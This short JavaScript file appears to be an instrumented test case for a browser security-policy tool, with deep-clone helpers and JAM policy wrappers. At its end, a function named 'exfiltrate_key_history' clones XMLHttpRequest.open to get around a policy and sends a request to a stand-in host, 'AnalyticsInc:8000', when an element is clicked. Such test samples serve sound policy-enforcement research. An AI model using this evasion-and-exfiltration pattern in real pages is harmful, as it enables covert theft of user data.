function clone(obj$$16) {
  var v9 = obj$$16 == null;
  var v15 = !v9;
  if (v15) {
    var v14 = typeof obj$$16;
    v9 = v14 != "object";
  }
  var v0 = v9;
  if (v0) {
    return obj$$16;
  }
  var temp = {};
  var key$$14;
  for (key$$14 in obj$$16) {
    introspect(JAM.policy.p1) {
      var v1 = obj$$16[key$$14]
    }
    var v24 = clone(v1);
    JAM.set(temp, key$$14, v24);
  }
  return temp;
}
function clone2(obj$$17) {
  var v2 = obj$$17.cloneNode;
  if (v2) {
    return obj$$17.cloneNode(true);
  }
  var v3;
  var v10 = obj$$17 instanceof Array;
  if (v10) {
    v3 = [];
  } else {
    v3 = {};
  }
  var copy = v3;
  var attr;
  for (attr in obj$$17) {
    introspect(JAM.policy.p1) {
      var v23 = obj$$17[attr]
    }
    var v19 = typeof v23;
    var v16 = v19 == "function";
    var v21 = !v16;
    if (v21) {
      introspect(JAM.policy.p1) {
        var v20 = obj$$17[attr]
      }
      v16 = v20 == null;
    }
    var v11 = v16;
    var v18 = !v11;
    if (v18) {
      introspect(JAM.policy.p1) {
        var v22 = obj$$17[attr]
      }
      var v17 = v22.clone2;
      v11 = !v17;
    }
    var v6 = v11;
    if (v6) {
      JAM.set(copy, attr, JAM.get(obj$$17, attr, JAM.policy.p1));
    } else {
      introspect(JAM.policy.p1) {
        var v12 = obj$$17[attr]
      }
      var v5 = v12 == obj$$17;
      if (v5) {
        JAM.set(copy, attr, copy);
      } else {
        introspect(JAM.policy.p1) {
          var v4 = obj$$17[attr]
        }
        var v25 = v4.clone2();
        JAM.set(copy, attr, v25);
      }
    }
  }
  return copy;
}
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  var v7 = xmlhttp;
  introspect(JAM.policy.p1) {
    var v13 = xmlhttp.open
  }
  var v26 = clone(v13);
  v7.opennew = v26;
  JAM.call(xmlhttp.opennew, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=clone1", true]);
  xmlhttp.send(null);
  return;
}
var v8 = document.getElementById("test");
JAM.set(v8, "onclick", exfiltrate_key_history)
